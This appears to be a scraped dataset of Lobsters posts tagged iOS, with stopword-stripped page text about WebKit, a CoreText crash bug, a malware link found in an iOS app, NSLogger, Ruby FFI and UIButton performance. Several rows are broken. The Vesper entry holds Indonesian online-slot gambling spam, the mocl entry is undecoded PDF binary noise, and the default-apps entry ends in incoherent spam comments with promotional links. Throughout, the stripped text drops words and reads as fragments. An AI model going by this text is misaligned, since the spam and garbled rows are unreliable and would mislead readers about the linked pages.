horizontally page improvement native development necessarily using web view io sdk includes javascript runtime javascript core framework providing wrapper objectivec standard javascript object use framework evaluate javascript code also parse json new property web view inline playback mode video instead default full screen mode new property web view enable autoplay video native webapp also safariservices framework io useful programmatically add url safari reading list remote debugging macos used remote debugging io must update safari version itunes version ability communicate io device time writing safari available preview abilites inside debugger previous version user interface changed lot much cleaner design yet list big case list feature announced safari mac safari io web speech api working io push notification website great addition io mac o background blend mode grid layout working io anything else bug problem post posted month ago private forum lot people sent bug report ask desperately forum solution believe apple give answer web developer event executing basic test suite detect api bug found api support bug feel free add comment using option available
567,Lobsters,ios,Apple iOS,"Rendering bug crashes OS X, iOS apps with string of Arabic characters",http://arstechnica.com/apple/2013/08/rendering-bug-crashes-os-x-and-ios-apps-with-string-of-arabic-characters/,rendering bug crash o x io apps string arabic character,discovered unicode death bug becoming public habrahabrru post tweet one azimuth security,nonsensical string arabic character render fine firefox crash io o x browser us apple coretext apiandrew cunningham new bug town crash mac iphone application poster hackernews thread late yesterday discovered possible crash web browser apps running current version io o x making render specific nonsensical string arabic character title hackernews thread implies issue webkit browser engine actually affect browser application us apple coretext api render text ar microsoft editor peter bright taken great pleasure sending text string coworkers crashed limechat irc client adium chat client among program safari crash o x io attempt read text string rendering string current stable release chrome prompt browser typical aw snap error page though chrome sandboxing implementation keep bug bringing whole browser firefox us font rendering engine display text fine support idea coretext issue problem particular application mac io device user twitter half joking labeling string unicode death text message display character caused people imessage apps spiral extended crash loop since string would displayed time user load previously sent message many email program also felled text even triggered including text network name wireless access point creating problem vulnerable device encounter name user look available connection tweet social networking dispatch enough cause browser crash within hour bug becoming public facebook already preventing character posted user wall timeline displaying message translated habrahabrru post bug claim issue fixed o x io affected user also happen early adopter new apple software able get fix soon however word whether future update io o x fix issue user ca nt nt want upgrade post also implies apple known issue six month tweet february implies nt first time issue found link may crash browser io o x proceed caution security researcher meanwhile poring crash dump like one sign bug could used even nefarious purpose remotely executing malicious code vulnerable device unclear whether could leveraged accomplish crashing target dan rosenberg senior security researcher azimuth security told ar depends degree invalid memory access controlled attacker input whether access read violation might leveraged leak information target process use complex attack write violation might used gain arbitrary code execution absolutely clear evidence time leveraged anything application crash unless learn ar mostly considers bug potential inconvenience annoyance user vulnerable device could change someone figure blast character message consumed large number mac io user attacker find way trigger remote code execution one option working around threat use firefox browser much possible nt rely coretext rendering unfazed exploit
568,Lobsters,ios,Apple iOS,GHC (the standard Haskell compiler) gets first class iOS support,https://groups.google.com/forum/#!msg/haskell-cafe/agDRueqFUFk/7SKMNGnmKV0J,ghc standard haskell compiler get first class io support,,use google group discussion please enable javascript browser setting refresh page
569,Lobsters,ios,Apple iOS,iOS 7 - a step in the right direction,https://medium.com/trends-predictions/611cfe1cee05,io step right direction,io step right direction,io step right directionthe design io like maze center maze perfect interface io carefully navigating one winding path getting closer closer center hit dead endclearly route center left choice turn around retrace step seek turning io first step along new path different old one although center reached dead end able proceed along path get closer possible route
571,Lobsters,ios,Apple iOS,"Creating iOS and Android Apps in Lisp, with mocl",http://wukix.com/dist/mocl_eclm2013.pdf,creating io android apps lisp mocl,,obj length r filter flatedecode stream x r endstream endobj obj endobj obj type page parent r resource r content r mediabox endobj obj procset pdf imageb imagec imagei xobject r endobj obj length r type xobject subtype image width height interpolate true colorspace devicergb smask r bitspercomponent filter flatedecode stream b b b b b b b b b b b b b l v rb urq eœëg g m⁄Ç e g ﬁös j ked k sk p bt v p ·ñ± l d◊òy v n »ápt ku €í –Ω œÜ
572,Lobsters,ios,Apple iOS,"John Gruber launches Vesper, a note‚Äìtaking app with unique visual design, a $5 price tag and no sync",http://vesperapp.co/,john gruber launch vesper app unique visual design price tag sync,mesin slot online gamenya para player cara bermain mesin slot online,mesin slot online gamenya para player mesin slot adalah salah satu game yang ada di casino yang dimana banyak permainan ini di dalam casino dengan tampilan yang berbeda tetapi tetap sama dengan mesin slot mesin slot selalu menjadi best seller game yang dimana banyak orang yang datang ke casino hanya ingin bermain game yang satu ini game ini tidak perlu mengunakan taktik yang bagus atau strategi yang matang mesin slot adalah game yang hanya mebutuhkan keberuntungan dan kesabaran yang bagus karena game mesin slot hanya menyamakan diaatara tiga gambar yang ada di mesin itu jika tombol dari mesin slot kita pencet atau di klik maka gambar yang ada dilayar dab akan berputar dan gambar yang berhenti ditengah itu sama maka kita akan mendapatkan uang mesin slot online gamenya para player perlu anda ketahui bahwa pendapatan terbesar kasino berasal dari permainan game slot dengan ratarata pendapatan mencapai dari keseluruhan permainan yang ada disediakan setiap kasino game slot ini menjadi daya tarik bagi setiap pemain kasino untuk mendapatkan banyak keuntungan selain itu slot diketahui sebagai permainan yang memiliki nilai seni yang tinggi dimana selain tampilan mesin yang unik suara dan gambar yang ada didalamnya dapat memberikan semangat yang lebih untuk setiap orang yang memainkannya cara bermain mesin slot online sekarang ini jika ingin bermain mesin slot kita tidak butuh lagi haruh pergi kecasino karena sudah ada mesin slot online yang dimana kita bisa bermain dirumah atau di tempat yang lain jika ingin bermain mesin slot online kalian harus kunjungi situs judi online terpercaya lalu anda mendaftar kan diri anda kekolam yang sudah disediakan setelah itu anda tinggal menunggu konfirmasi email dari pihak agen judi online setelah selesai maka maka anda menaruh uang anda atau deposit uang anda di agen judi online dengan jumlah minimal ribu setelah itu anda akan mendapatkan id dan password untuk bisa masuk ke permainan mesin slot
573,Lobsters,ios,Apple iOS,Shareable Web Links that Open iOS Deep Links,http://benroesch.com/2013/05/23/shareable-web-links-that-open-ios-deep-links/,shareable web link open io deep link,app store http bcroesch,building available app store built number deep linking option wrote indepth adding deep link io app deep link wanted able share people around web however sharing link look like ffprophets confusing people nt necessarily clickabletouchable many case make easier share deep link app added quick simple snippet nginx config redirects deep link url open inside app look like location deeplink httpuseragent iphone rewrite deeplink ffprophets permanent rewrite deeplink deeplinkhtml last break share url like http download app visit page iphone try people access url mobile safari device redirect ffprophets open access page computer show deeplinkhtml page informs link need opened mobile device app installed give link download itps found helpful love hear twitter bcroesch
574,Lobsters,ios,Apple iOS,Venmo Touch Screencasts: Add one touch credit card payments to your app in 15 minutes,https://www.braintreepayments.com/braintrust/venmo-touch-screencasts-add-one-touch-payments-to-your-app-in-15-minutes,venmo touch screencasts add one touch credit card payment app minute,braintree io sdk venmo touch venmo touch add one touch credit card payment io app minute using braintree io sdk venmo touch,braintree io sdk upgraded last month include two great new feature dropin payment form venmo touch demonstrate easy integrate io app look like done created two brand new developerfocused videoswhat venmo touch video demo venmo touch allows user pay apps card saved apps also show payment form bundled venmo touch braintree io sdk includes ui component clientside validation logic prevent user mistyping credit card information make checkout process fast easyvideoadd one touch credit card payment io app minute using braintree io sdk venmo touchwhenever developer integrating venmo touch ask long take add sdk app tell finish afternoon reaction seriously show easy add venmo touch braintree io sdk app recorded live coding screencast creates new app integrates sdk minutesvideo
575,Lobsters,ios,Apple iOS,What‚Äôs a known source of malware doing in an iOS app?,http://arstechnica.com/security/2013/05/whats-a-known-source-of-malware-doing-in-an-ios-app-ars-investigates/,known source malware io app,link likely harmless simply find safe browsing service documented existence link inside android app,warning delivered google safe browsing service link reported malicious embedded game available apple io app store first blush looked serious web link known source malware buried deep inside highly rated app available month apple io app store year antivirus program recognized chinabased supplier malicious code targeting window user people behind operation expanding campaign snare iphone ipad user although macworld writer lex friedman said link likely harmless nt sure pointed io app antivirus provider bitdefender warned simply find app last updated october contained malware classified trojanjsiframebkd even suspicious google safe browsing service causing firefox chrome browser block attempt visit address ground reported attack page attack page intentionally distribute harmful software many compromised without knowledge permission owner google advisory warned recently thursday link embedded html tag known iframe file included game put importantly infecting people installed simply find io device spoke researcher specializing smartphone security bitdefender lookout security examining app determined app pose risk io user exploit hosted past xasomcn nt visit site unless know designed load malicious code inside existing html file potential damage certain webbrowsing setting presence storage device computer smartphone fact harmless code malicious placed right context ie html document side effect injected wrong file bogdan botezatu senior ethreat analyst bitdefender told known mechanism date exploit behavior user machine file definitely pose threat io user boteazatu speculated iframe accidentally included metadata embedded file likely infected computer stored sound file point tim wyatt director security engineering lookout agreed rogue link likely result accidental crosscontamination definitely agree assessment apparent threat wrote email likely case developer unwittingly including file swept compromise another system without aware injected content theory make much sense anything think wyatt went note would nt first time malicious code inadvertently embedded smartphone app february lookout researcher tim strazzere documented existence link inside android app also pointed site known malicious speculated added someone compiling code infected computer app almost certainly nt threat end user although might problem smartphone running custom version android issue cross contamination shine light app vetting process performed apple google company far kept fairly opaque av company detect malicious link io android apps seems reasonable company running app store google play malicious link far turned harmless hacker definition find way make hardware software behave new unexpected way next time might lucky
577,Lobsters,ios,Apple iOS,"Helios: a Ruby-based, extensible, open-source mobile backend framework for iOS",http://helios.io/,helios rubybased extensible opensource mobile backend framework io,,
578,Lobsters,ios,Apple iOS,FFI: Foreign Function Interfaces for Fun & Industry,http://spin.atomicobject.com/2013/02/15/ffi-foreign-function-interfaces/,ffi foreign function interface fun industry,foreign function interface rubygame ruby wrote experience chipmunk game physic engine use jruby rubinius use making c library friendly always reaching beyond c investing useful abstraction real rubygame code macruby rubymotion jruby wrapping,love writing code highlevel language like ruby lot cool useful library written lowerlevel language like c ala programmer three common approach solving conundrum port part library language choice write extension c code bridge gap library language wrap library using language foreign function interface ffi support used three approach history developing rubygame began combination ruby port c extension migrated combination ruby port ffi wrapper using rubyffi year ago fellow atom shawn anderson wrote experience creating rubyffi wrapper chipmunk game physic engine based experience say ffi awesome ffi wrapper much easier write maintain c extension portable across platform language implementation easier user install lthough ffi experience ruby many language offer form ffi support common lisp haskell lua python perl java name many benefit limitation ffi describing post apply much language ruby ffi ffi refers ability code written one language host language ruby access invoke function written another language guest language c term foreign refers fact function come another language environment depending language ffi support might also able access global named variable automatically convert data type host guest language code guest language invoke function host language callback interpreted language like ruby usually possible use library compiletime feature like c preprocessor macro constant ie thing define library header ffi access library binary code eg dylib dll directly without compiling code however ffi support compiled language work compiling c code case may able use compiletime feature depends language implement ffi use ffi mentioned earlier using ffi many benefit writing extension c migrated rubygame extension written wrapper using rubyffi significant benefit observed much easier write maintain code written language choice leverage language highlevel feature metaprogramming abstract wrapper code easier user install need c compiler development header library wrapping especially important want library accessible window macos x user platform c compiler installed default case ruby ffi code portable implementation extension written c example code using rubyffi run well mri usual ruby implementation jruby rubinius modification whatever language choice need interface library written c highly recommend trying ffi first use ffi amazing ffi always right tool job example c extension may better approach scenario need implement lowlevel highlyoptimized code ideally function c library wrapping heavy lifting need write custom code directly process huge array numerical binary data might need write code c another lowerlevel language get performance want need perform delicate callback guest language host language although sometimes possible depending host language ffi support perform callback kind complex callback function signature quite tricky satisfy ffi library make heavy use compiletime preprocessor feature c macro case simple macro may able reimplement behavior function language choice library serious macrofu might better writing c extension constant created using define also slight nuisance since ffi system able see redefine constant code aware library change value constant need update code well make supporting multiple library version tricky endeavor especially library version number defined preprocessor constant making c library ffi friendly looking another angle checklist making c library ffi friendly hard drastically increase potential user base library always always always export library version number either global const variable eg three const variable function return version number struct fine also define version number library header define alone sufficient either export important constant global const variable perhaps addition using enum define publicly document value make commitment announce future change well advance provide function equivalent important preprocessor macro andor clearly document purpose functionality important macro reimplemented another language keep callback signature simple shallow welldocumented especially important callback necessary use library core functionality library written c consider also offering ccompatible interface using extern c least core functionality library c library compiled method name may mangled way entirely predictable making tricky wrap ffi worth noting besides making library ffi friendly general good practice make library stable mature accessible reaching beyond c many language provide c library allows developer interface language example libobjc objectivec liblua lua java native interface jni library typically used within program written c c feeling clever bit foolhardy actually use ffi build bridge ruby language used technique rubygame interface objectivec could make call macos x cocoa ui framework barebones example using rubyffi interface objectivec macos x load ffi gem require ffi module objc extend ffi library load libobjc library ffilib objc bind selregistername function accepts string return equivalent objectivec selector ie message name attachfunction selregistername string pointer bind objcmsgsend function sends message objectivec object accepts pointer object sent message pointer selector varargs array argument sent message return pointer result sending message attachfunction objcmsgsend pointer pointer varargs pointer convenience method using objcmsgsend selregistername easily send objectivec message ruby def selfmsgsend id selector args selector selregistername selector selectorisa string return objcmsgsend id selector args end bind objcgetclass function accepts name objectivec class return pointer class attachfunction objcgetclass string pointer end module cocoa extend ffi library load cocoa framework binary code ffilib systemlibraryframeworkscocoaframeworkcocoa needed properly set objectivec environment attachfunction nsapplicationload bool nsapplicationload accepts ruby string creates equivalent nsstring instance return pointer def selfstringtonsstring string nsstringclass objcobjcgetclass nsstring objcmsgsend nsstringclass string string end accepts pointer nsstring object return string content ruby string def selfnsstringtostring nsstringpointer cstringpointer objcmsgsend nsstringpointer cstringpointernull return null else return cstringpointerreadstring end end end create new empty nsmutablearray instance nsmutablearrayclass objcobjcgetclass nsmutablearray array objcmsgsend nsmutablearrayclass array add two nsstring object array w hello world string objcmsgsend array addobject pointer cocoastringtonsstring string end print array description analogous ruby inspect description objcmsgsend array description put cocoansstringtostring description console output script run hello world load ffi gem require ffi module objc extend ffi library load libobjc library ffilib objc bind selregistername function accepts string return equivalent objectivec selector ie message name attachfunction selregistername string pointer bind objcmsgsend function sends message objectivec object accepts pointer object sent message pointer selector varargs array argument sent message return pointer result sending message attachfunction objcmsgsend pointer pointer varargs pointer convenience method using objcmsgsend selregistername easily send objectivec message ruby def selfmsgsend id selector args selector selregistername selector selectorisa string return objcmsgsend id selector args end bind objcgetclass function accepts name objectivec class return pointer class attachfunction objcgetclass string pointer end module cocoa extend ffi library load cocoa framework binary code ffilib systemlibraryframeworkscocoaframeworkcocoa needed properly set objectivec environment attachfunction nsapplicationload bool nsapplicationload accepts ruby string creates equivalent nsstring instance return pointer def selfstringtonsstring string nsstringclass objcobjcgetclass nsstring objcmsgsend nsstringclass string string end accepts pointer nsstring object return string content ruby string def selfnsstringtostring nsstringpointer cstringpointer objcmsgsend nsstringpointer cstringpointernull return null else return cstringpointerreadstring end end end create new empty nsmutablearray instance nsmutablearrayclass objcobjcgetclass nsmutablearray array objcmsgsend nsmutablearrayclass array add two nsstring object array w hello world string objcmsgsend array addobject pointer cocoastringtonsstring string end print array description analogous ruby inspect description objcmsgsend array description put cocoansstringtostring description console output script run hello world see connecting ruby c objectivec requires significant amount glue code dealing three different system objectsdata functionsmethods done actually make quite manageable easy use investing useful abstraction real rubygame code course want write ruby code interface objectivec probably easier use macruby rubymotion io development likewise jruby solid platform interfacing java code ffi still useful provide broader platform support intellectual challenge code actually allowed jruby code interface cocoa chain ruby java virtual machine c objectivec wrapping see ffi powerful tool ruby language need wrap library another language would encourage reach ffi first resort c extension special circumstance make necessity user thank future self maintain code
580,Lobsters,ios,Apple iOS,"NSLogger: A flexible, modern logging tool for iOS",https://github.com/fpillet/NSLogger,nslogger flexible modern logging tool io,nslogger nslogger nslogger viewer nslogger basic usage swift objectivec installation step step step desktop viewer download nslogger desktop viewer client framework install cocoapods install cocoapods carthage install advanced usage using nslogger shared network set logger option manual framework install connection work advanced desktop viewer feature regular expression matching marker mac o x later advanced color configuration high performance low overhead credit new bsd licence louis harboe,nslogger nslogger high performance logging utility display trace emitted client application running macos io android replaces traditional console logging trace nslog java log nslogger viewer run macos replaces xcode android studio eclipse console provides powerful addition like display filtering defining log domain level image binary logging message coloring trace buffering timing information link source code etc nslogger feature summary view log using desktop application log sent device simulator accept connection local network client using bonjour remote client connecting directly internet online application running connected nslogger offline saved log log viewing buffer trace memory file send viewer connection acquired define log domain app view model controller importance level error warning debug color log message using regexp log image raw binary data secure logging connection use ssl default advanced log filtering option save viewer log share andor review later export log text file open raw buffered trace file brought back client application directly connected log viewer look like action macos mojave later dark mode basic usage without change code nslog log application redirected nslogger desktop viewer viewer found automatically network using bonjour rich api let log message binary data image lot detail simple wrapper available convenience swift wrapper api import nslogger logging message loggersharedlog network info checking paper logging image loggersharedlog view noise myprettyimage logging data loggersharedlog custom domain noise somedataobject objectivec wrapper api import nsloggernsloggerh loggerapp hello world today self mydate loggernetwork hello world today self mydate installation step download nslogger desktop app mac step add nslogger framework project step step desktop viewer download download prebuilt signed version nslogger desktop viewer macos nt forget launch application mac wo nt show window client connects start logging client framework install cocoapods install project configured use cocoapods add line podfile includes c objc apis suitable use application without swift code swift syntactic sugar apis added swift subspec developing code swift mixed swift objc environment use note nt strictly need include swift variant swift application perfectly develop extension call nslogger c apis without using basic provided one finally using framework library may use nslogger use nostrip variant force linker keep nslogger function final build even code nt use since linked framework may dynamically check presence nslogger function required linker would nt see use carthage install nslogger carthagecompatible build two framework nslogger nsloggerswift need pick either one use application used swift nsloggerswift variant add simple swift layer make nslogger easier use swift code perfectly develop extension call nslogger c apis without using basic provided one use nslogger framework depending framework choose code need import nslogger import nsloggerswift difference cocoapods support always import nslogger github fpilletnslogger run nsloggerxcodeproj toplevel project offer two target nslogger nsloggerswift add built framework suit need advanced usage using nslogger shared network first log sent nslogger start logger default first bonjour service encountered multiple nslogger user share network logger connection get mixed avoid confusion user add app start example applicationdidfinishlaunching method loggersetupbonjourforbuilduser preference pane nsloggerapp desktop viewer go network tab type user name ie user bonjour service name text field allow trace received computer user compiled app work nslogger added project using cocoapods set logger option example nt want disable osactivitymode scheme need log wan na log nslogger swift call init function func loggerinit let pointer loggergetdefaultlogger var option loggergetoptions pointer option kloggeroptioncapturesystemconsole disable option loggersetoptions pointer option manual framework install using nslogger without cocoapods add loggerclienth loggerclientm loggercommonh well add cfnetworkframework systemconfigurationframework framework io mac o x application replace nslog call logmessagecompat call recommend using macro turn log building distribution version application connection work automatic discovery desktop viewer application must run device network mac app start logging nslogger framework automatically default look desktop viewer using bonjour soon trace start coming new window open mac advanced user setup remote host port log client specific host specify bonjour name case multiple viewer network advanced desktop viewer feature desktop viewer application provides tool like filter regular expression matching let perform data mining log timing information message display time elapsed since previous message filtered display get sense time event application image binary data display directly log window marker client connected place marker end log clearly see happens afterwards example place marker pressing button application fast navigation log display export log text optional display file line function uncluttered display log saved nsloggerdata file reloaded later logging file name log file extension rawnsloggerdata nslogger reopen process client remotely generating raw logger data file send investigate postmortem note nslogger mac o x viewer requires mac o x later advanced color configuration apply color tag message using regular expression define color use standard nscolor name example blue hex color example add prefix bold example bold red high performance low overhead nslogger framework run thread application try hard consume cpu memory possible desktop viewer found yet trace buffered memory connection acquired allows tracing difficult situation example device wakeup time network connection running credit nslogger copyright c florent pillet right reserved wrong revenged released new bsd licence nslogger icon copyright c louis harboe
581,Lobsters,ios,Apple iOS,Show Lobsters: A Lobsters iPhone app I've started working on,https://github.com/jcs/lobsters/issues/42#issuecomment-11519034,show lobster lobster iphone app started working,join github today sign,dismiss join github today github home million developer working together host review code manage project build software together sign
582,Lobsters,ios,Apple iOS,Thoughts on default apps on iOS,http://thomasst.ch/defaultapps/,thought default apps io,thought default apps io map calling messaging browser mail music reference http enwikipediaorgwikieuropeanunionmicrosoftcompetitioncase comment say say say leave comment back homepage,thought default apps io computer set default browser mail app ca nt iphone thanks great variety mobile apps think default app integration mobile device even important computer particular like see map release io many people looking alternative map apps default map app open use siri get direction open url look like map integration even deeper application us map favorite mapping service used needed developer could specify need map street view capability system could choose appropriate map calling people use builtin calling app user might want use google voice ca nt io pas call google voice app nt copy paste number messaging send text message siri share picture might want route favorite messaging app lot people use apps whatsapp google voice communicate friend browser point using chrome mercury phone link always open safari especially important since way add functionality safari using extension mail alternative mail apps exists nt integrate well system apple provide way developer replace default mail share sheet instance gmail user able use gmail app seamlessly music whenever press play button headphone music app start playing instead launching spotify left stop switch favorite music app inconveniece every single time please apple nt force use apps eu nt let microsoft offer window medium player also forced microsoft every user choose default browser fine forced use apple apps iphone think eu went way far trying get microsoft release window without medium player without web browser think missing ability choose default apps mobile device far inconvenient end user reference http enwikipediaorgwikieuropeanunionmicrosoftcompetitioncase comment immigration banking nodule currency covert say flagged non delivering currency adjudication sedimented security natural origin land currency first exposed highest height infrared line regime converting trading democracy expenditure used accepted inflation capicolas returning diffrent format personal incentive growth lost deprecated depreciation excess immeadiate stopgain insurance insurgenceyour company established country trusted antimigrated post partim visa granted citizen rounded deported loss gained u accounted upmost penny inflated maximum appreciation allowable currincies choice law abiding legal standard regulating asserting statuants agreement sedimented u virtuous dividendsfinancial gained monetary bond reciprocating definately lesser equating worth penny entirety go u dollar coinbasevickie r thomasyou win kashif mahmood say really nice post href http trustemocomyoutubemoneycalculator trustemocom href http forexpopscomonlinetradingacademyreviews online trading academy review cool nice post admin href http zonginternetpackagespkzongpackagesinpakistansms zong sm package hrefhttp birthdaycakesnamecomwritebirthdaycakesimageswithnameeditoptionandphotos birthday cake name tubbo say remember last year seen actual replacement safari mail term phone app never going see replacement certainly requirement carrier call routed pay minute thing message carrier going want phone network let people easily send free text sm plan huge profit marginsone thing agree inability change default music app even worse get car bluetooth receiver pair phone almost always start song music app even playing soundcloud spotify moment annoying definitely encouragement apple use itunes app store buying browsing music considering itunes store giant advertisement iphone ipod nt think would hurt much allowed u choose default music app leave comment back homepage
583,Lobsters,ios,Apple iOS,#inspect 2013 - First RubyMotion Conference,http://www.rubymotion.com/conference/,inspect first rubymotion conference,inspect july paris france inspect may san francisco california inspect march brussels belgium,inspect july paris france third edition rubymotion inspect held paris france ecole private engineering school revolutionary teaching method hosted u several student attended talk attendee speaker made conference onetrack event croissant pastry served breakfast delicious cheese among french food served lunch brought androidpowered beer tap closing party inspect may san francisco california second edition rubymotion inspect happened sunny san francisco california welcomed everyone fort mason former u army post located marina district protected national historic landmark attendee speaker came conference onetrack event californianstyle breakfast lunch served ended event great party featuring music local beer san francisco inspect march brussels belgium inaugural edition rubymotion inspect held brussels belgium special edition picked awesome venue brussels grand place unesco site heritage attendee speaker made conference onetrack event pastry served breakfast belgian food served lunch concluded event awesome party featuring huge selection belgian beer
584,Lobsters,ios,Apple iOS,KVC Collection Operators : NSHipster,http://nshipster.com/kvc-collection-operators/,kvc collection operator nshipster,sleek new object literal fast enumeration expression keyvalue coding kvc collection operator simple collection operator object operator array set operator simple collection operator object operator array set operator probably terrible idea apple documentation kvc collection operator note guy english pretty amazing post swizzle dsl,rubyists laugh objectivec bloated syntax although lost pound summer sleek new object literal redheaded bully still taunt u map oneliners fancy symbol toproc really lot elegant clever language come well avoids loop even fast enumeration expression drag matter sugarcoat loop block code something much simpler describe natural language get average salary employee array double totalsalary employee employee employee totalsalary employeesalary doublevalue double averagesalary totalsalary employee count meh fortunately keyvalue coding give u much employee valueforkeypath avgsalary kvc collection operator allows action performed collection using key path notation valueforkeypath time see key path denotes particular aggregate function whose result returned chained like key path collection operator fall one three different category according kind value return simple collection operator return string number date depending operator object operator return array array set operator return array set depending operator best way understand work see action consider product class product array following data interface product nsobject property nsstring name property double price property nsdate launchedon end keyvalue coding automatically box unboxes scalar nsnumber nsvalue necessary make everything work name price launch date iphone september ipad mini november macbook pro june imac november simple collection operator count return number object collection nsnumber sum convert object collection double computes sum return sum nsnumber avg take double value object collection return average value nsnumber max determines maximum value using compare object must support comparison one another work min max return minimum value collection example product valueforkeypath count product valueforkeypath sumprice product valueforkeypath avgprice product valueforkeypath maxprice product valueforkeypath minlaunchedon june get aggregate value array set nsnumber value simply pas self key path operator example valueforkeypath maxself produce value object operator let say inventory array representing current stock local apple store running low ipad mini new imac shipped yet nsarray inventory ipadmini macbookpro macbookpro unionofobjects distinctunionofobjects return array object property specified key path right operator distinctunionofobjects remove duplicate whereas unionofobjects example inventory valueforkeypath unionofobjectsname iphone iphone iphone ipad mini macbook pro macbook pro inventory valueforkeypath distinctunionofobjectsname iphone ipad mini macbook pro array set operator array set operator similar object operator work collection nsarray nsset would useful example compare inventory several store say applestoreinventory previous example verizonstoreinventory sell iphone ipad mini stock distinctunionofarrays unionofarrays return array containing combined value array collection specified key path right operator expect distinct version remove duplicate value distinctunionofsets similar distinctunionofarrays expects nsset containing nsset object return nsset set contain duplicate value anyway distinct operator example applestoreinventory verizonstoreinventory valueforkeypath distinctunionofarraysname iphone ipad mini macbook pro probably terrible idea curiously apple documentation kvc collection operator go way make following point note currently possible define collection operator make sense spell since people thinking see collection operator first time however turn actually possible little help friend objcruntime guy english pretty amazing post wherein swizzle valueforkeypath parse customdefined dsl extends existing offering interesting effect nsarray name allemployees valueforkeypath collect daysoff name code would get name anyone taken fewer day remind take vacation doubt taken ridiculous extreme nsarray albumcovers record valueforkeypath collect artist like bon iver nsunarchivefromdatatransformername albumcoverimagedata eat heart ruby oneliner filter record collection artist whose name match bon iver initializes nsimage album cover image data matching album good idea probably nspredicate rad breaking complicated logic underrated insanely cool bet clever example shown possible direction future objectivec dsl metaprogramming kvc collection operator mustknow anyone want save extra line code look cool process scripting language like ruby boast considerably flexibility oneliner capability perhaps take moment celebrate restraint built objectivec collection operator ruby hella slow amiright troll
585,Lobsters,ios,Apple iOS,Objective-C Primer (ft. Mr. Higgie),https://speakerdeck.com/rubymaverick/objective-c-primer-ft-mr-higgie,objectivec primer ft mr higgie,fewer faster,copyright fewer faster llc slide content description owned creator
587,Lobsters,ios,Apple iOS,A Performance-minded take on iOS design,http://robots.thoughtbot.com/post/36591648724/designing-for-ios-graphics-performance,performanceminded take io design,note building io interface previous article update introduced update provide clarification,note even though technology stack io remained largely unchanged hybrid approach described article overkill today standard want take fresher look designing io interface using xcode swift check new building io interface series previous article explored different technique customize look feel uibutton assigning difficulty level based complexity objectivec code involved implementation intentionally left mentioning however method come nontrivial performance ramification taken consideration choosing one another order understand performance affected need closer look technology stack behind graphic io block diagram represents different framework library relate topmost layer highlevel objectivec framework manages graphical user interface io made collection class corresponding specific ui control uibutton uilabel uikit built top core animation framework introduced o x leopard ported io power smooth transition later became known deeper stack opengl e openstandard library rendering computer graphic mobile device widely used game graphic power core animation uikit last piece software stack core referred cpubased drawing engine made debut o x two lowlevel framework written c programming language bottom row diagram represents hardware stack composed graphic card gpu main processor cpu talk hardware acceleration gpu used compositing rendering graphic case opengl core animationuikit implementation built top recently hardware acceleration major advantage io held android animation latter felt noticeably choppier result reliance cpu drawing offscreen drawing hand refers process generating bitmap graphic background using cpu handing gpu onscreen rendering io offscreen drawing occurs automatically following case core graphic class prefixed cg drawrect method even empty implementation calayers shouldrasterize property set yes calayers using mask setmaskstobounds dynamic shadow setshadow text displayed screen including core text group opacity uiviewgroupopacity general rule offscreen drawing affect performance animation involved inspect part ui drawn offscreen using instrument io device plug developmentready io device using usb open instrument using developer application menu xcode select io graphic core animation template bring detail pane using middle toggle icon select device target check color offscreenrendered yellow debug option device anything drawn offscreen overlaid yellow tint update also inspect offscreen rendering checking debug color offscreenrendered option io simulator unless performance case simulator easiest straightforward way inspect offscreen rendering let look performance footprint previously introduced approach customizing button uiimage background relies entirely gpu rendering image asset saved disk resizable background image variant considered least resourcehungry approach since result smaller app bundle take advantage hardware acceleration stretching tiling pixel calayerbased method implemented requires offscreendrawing pass us masking render rounded corner also explicitly disable animation come turned default using core animation bottom line unless need animated transition technique adequate custom drawing drawrect method relies core graphic custom drawing main drawback lie way handle touch event time button pressed setneedsdisplay force redraw twice every single tap good use cpu memory especially multiple instance uibutton interface mean using prerendered asset viable solution short answer still need flexibility drawing code technique optimize code reduce performance footprint one way generate stretchable bitmap image reuse across instance start creating new subclass uibutton following step detailed previous tutorial define classlevel static variable cbhybridm import cbhybridh implementation cbhybrid resizable background image normal state static uiimage gbackgroundimage resizable background image highlighted state static uiimage gbackgroundimagehighlighted background image border radius height static int borderradius static int height next move drawing code drawrect cbbezier new helper method couple change generate resizable image instead fullsized one save output static variable later reuse uiimage drawbackgroundimagehighlighted bool highlighted drawing code go first need get width resizable image optimal performance want stretchable area vertical center image float width borderradius height matter le case long button tall enough gradient visible value picked match height button moving need bitmap context draw let create one uigraphicsbeginimagecontextwithoptions cgsizemake width height cgcontextref context uigraphicsgetcurrentcontext cgcolorspaceref colorspace cgcolorspacecreatedevicergb setting second boolean argument ensure image context opaque last argument scale factor screen density set default scale factor device next block exactly like previous core graphic implementation cbbezier save updated value use highlighted argument instead default selfhighlighted property gradient declaration nsarray gradientcolors draw rounded rectangle bezier path uibezierpath roundedrectanglepath uibezierpath bezierpathwithroundedrect cgrectmake width height cornerradius borderradius use bezier clipping path roundedrectanglepath addclip use one two gradient depending state button cggradientref background highlighted highlightedgradient gradient draw gradient within path cgcontextdrawlineargradient context background cgpointmake cgpointmake draw border bordercolor setstroke draw inner glow uibezierpath innerglowrect step need add compared cbbezier method save output uiimage call uigraphicsendimagecontext clean u uiimage backgroundimage uigraphicsgetimagefromcurrentimagecontext cleanup uigraphicsendimagecontext method generate background image implement common initializer method instantiate image set background cbhybrid instance void setupbackgrounds generate background image necessary gbackgroundimage gbackgroundimagehighlighted gbackgroundimage self drawbackgroundimagehighlighted resizableimagewithcapinsets uiedgeinsetsmake borderradius borderradius borderradius borderradius resizingmode uiimageresizingmodestretch gbackgroundimagehighlighted self drawbackgroundimagehighlighted yes resizableimagewithcapinsets uiedgeinsetsmake borderradius borderradius borderradius borderradius resizingmode uiimageresizingmodestretch set background button instance self setbackgroundimage gbackgroundimage forstate uicontrolstatenormal self setbackgroundimage gbackgroundimagehighlighted forstate uicontrolstatehighlighted proceed setting button type custom implementing initwithcoder initwithframe button instance created code cbhybrid buttonwithtype uibuttontype type return super buttonwithtype uibuttontypecustom id initwithcoder nscoder adecoder self super initwithcoder adecoder self self setupbackgrounds return self make sure new subclass working properly duplicate one button interface builder change class cbhybrid change button content cgcontextgenerated image build run full subclass code found said done prerendered asset would still perform better codebased solution much gain term flexibility efficiency core graphicsis hybrid approach like one covered would affect performance noticeable degree today hardware update andy matuschak member uikit team kind enough provide clarification offscreen rendering well good insight cachepurging comment section
